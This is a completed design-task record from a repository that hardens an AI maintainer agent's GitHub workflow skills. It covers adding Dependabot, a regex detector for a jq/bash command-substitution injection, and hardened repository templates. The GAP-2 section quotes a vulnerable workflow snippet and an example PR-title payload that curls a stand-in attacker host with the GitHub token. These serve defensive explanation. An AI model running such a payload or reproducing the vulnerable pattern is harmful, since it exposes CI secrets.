---
trdd-id: c0734bde-9d36-49c7-98a7-dcae2f83794d
title: Supply-chain article response — close article-vector gaps GAP-1 GAP-2 GAP-4 (Phase A)
column: completed
created: 2026-05-23T17:50:01+0200
updated: 2026-08-07T12:08:37+0200
---

## TRDD-c0734bde — Supply-chain article response — close article-vector gaps GAP-1 GAP-2 GAP-4 (Phase A)

**Filename:** `design/tasks/TRDD-20260523_175001+0200-c0734bde-supply-chain-gaps-phase-a.md`
**Tracked in:** this repo (design/tasks/ is git-tracked)

## Implementing commit

- c4b82d6 — `feat(security): close article-vector gaps GAP-1/2/4 (Phase A)`

## User request (verbatim, reconstructed from commit body)

> Closes 3 of the 4 gaps surfaced by the supply-chain audit against
> Atai Barkai's "Supply chain attacks are at an all-time high"
> (2026-05-20). Phase A is mechanical and low-risk; Phase B (Guardian
> core) and Phase C (skill wiring) follow in separate commits.

The trigger was a directed audit: read Barkai's article naming every
known 2025–2026 supply-chain attack vector, map each one to a concrete
gap in the maintainer agent's behavior, and split the response into
phases ordered by risk. Phase A had to be the safe, mechanical edits
that could land first without touching the agent's decision logic.

## Scope — which gaps Phase A closes

Three of the four gaps the audit surfaced:

### GAP-1 — Dependabot is missing despite SHA-pinning

SHA-pinning third-party actions defeats tag-rewriting (the
`tj-actions/changed-files` class of attack), but a pinned SHA goes
silently stale. If upstream ships a security patch, the pinned
consumer never sees it. Dependabot is the OTHER half of the pattern:
it surfaces upstream patches as PRs that the maintainer can review
and SHA-re-pin against. Without Dependabot, SHA-pinning trades one
vulnerability class (tag mutation) for another (stale code).

### GAP-2 — `jq --arg` trap detector missing from workflow-fix-safe

The article calls out this specific bug as one that "survived three
prior review passes because env var indirection looked correct at a
glance":

```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: |
  PAYLOAD=$(jq -nc --arg text "New PR: ${PR_TITLE}" '{text: $text}')
```

The `env:` indirection defeats GitHub-expression injection, but
`${PR_TITLE}` inside a double-quoted bash string is still expanded by
bash via command substitution BEFORE `jq` sees it. A PR title like
`$(curl evil.com/x?t=$GH_TOKEN)` executes. The workflow-fix-safe skill
already covered four hardening edits but had no rule for this pattern.

### GAP-4 — workflow-bootstrap doesn't seed supply-chain templates

New repos created via workflow-bootstrap inherited the SHA-pinned
release workflow but neither `.github/dependabot.yml` nor a hardened
`.npmrc`. Greenfield repos were therefore born with the same gap GAP-1
fixed in the existing repo.

(GAP-3, adversarial-issue-content, is deferred to Phase B/C — see
sibling TRDDs.)

## Design decisions

1. **GAP-1 cadence.** Weekly Dependabot runs (not daily). Grouped
   minor+patch updates so the maintainer reviews one batched PR per
   ecosystem per week rather than a flood of one-line PRs. Major
   updates ungrouped because they routinely break things and deserve
   per-PR scrutiny.
2. **GAP-2 detector is a regex scan, not an AST parse.** The pattern
   `jq[^|]*"[^"]*\$\{[A-Z_][A-Z0-9_]*\}` catches every `${VAR}` inside
   a double-quoted string on the same `jq` line. Refactor target is
   `--arg name "$VAR"` + `$name` inside the jq filter — jq parses
   `$name`, bash never sees it. The regex emits 0 hits on clean code,
   so the hardening edit is a no-op on clean workflows.
3. **GAP-2 lives as Hardening Edit #5 in workflow-fix-safe.** Same
   skill, same surface, same yaml-aware Read+Edit rule (never sed/awk
   on YAML). Adding a 6th edit was rejected as scope creep.
4. **GAP-4 templates live under** `skills/workflow-bootstrap/references/templates/`.
   Bootstrap Step 5 seeds them via `cp`, the same mechanism used for
   the validate.yml template. Node repos additionally get `.npmrc`
   (24h quarantine + exotic-subdep block); Python/Go repos do not.

## Files touched (commit c4b82d6)

```
.github/dependabot.yml                                              (NEW)
skills/workflow-bootstrap/SKILL.md                                  (MOD)
skills/workflow-bootstrap/references/instructions.md                (MOD, +Step 5 supply-chain seed)
skills/workflow-bootstrap/references/templates/dependabot.yml       (NEW)
skills/workflow-bootstrap/references/templates/npmrc-hardened       (NEW)
skills/workflow-fix-safe/SKILL.md                                   (MOD)
skills/workflow-fix-safe/references/instructions.md                 (MOD, +Hardening Edit #5)
```

## Acceptance criteria (all met by c4b82d6)

- [x] `.github/dependabot.yml` exists at repo root with weekly cadence
      and grouped minor+patch updates.
- [x] workflow-fix-safe references/instructions.md contains a
      "Hardening Edit #5 — jq command-substitution audit" section
      with the exact regex `jq[^|]*"[^"]*\$\{[A-Z_][A-Z0-9_]*\}` and
      the `--arg`/`$name` rewrite pattern.
- [x] `skills/workflow-bootstrap/references/templates/dependabot.yml`
      and `npmrc-hardened` exist.
- [x] workflow-bootstrap Step 5 instruction prose names both templates
      and the seeding behavior.
- [x] No agent decision logic was touched — Phase A is mechanical.

## Post-mortem

**What worked:**
- The phased split (A mechanical / B core / C wiring) let Phase A land
  before the agent's behavioral surface was perturbed. A reviewer who
  trusts the existing agent could merge Phase A without re-reading the
  whole maintainer chain.
- Putting the GAP-2 fix as an additional hardening edit inside an
  EXISTING skill (workflow-fix-safe) rather than a new skill avoided
  the discoverability problem — anyone running workflow-fix-safe gets
  the new check automatically.
- Phrasing the regex strictly enough that clean workflows emit zero
  hits means the skill stays a no-op cost on the happy path.

**What was tricky:**
- The article quotes the vulnerable jq pattern with a specific shape;
  it would have been easy to write the detector to match only that
  exact shape and miss variations. The regex was deliberately
  generalized to `[A-Z_][A-Z0-9_]*` (any uppercase env-var name) so
  it catches `${GH_TOKEN}`, `${ISSUE_BODY}`, `${PR_TITLE}` etc.
- The Dependabot cadence decision (weekly vs daily) is a real
  tradeoff between freshness and review burden. We settled on weekly
  because the marketplace cadence the maintainer-agent serves is
  also weekly-ish.

**Lessons for future work:**
- New supply-chain attack vectors landing in the wild should map
  straight onto this TRDD's pattern: gap identified → name it
  (`GAP-N`) → decide Phase (mechanical / core / wiring) → record
  here.
- The two new templates (`dependabot.yml`, `npmrc-hardened`) are
  read-only in this commit; future audits may want them
  parametrised (project-specific schedule, custom block lists).
  That work is a separate TRDD.
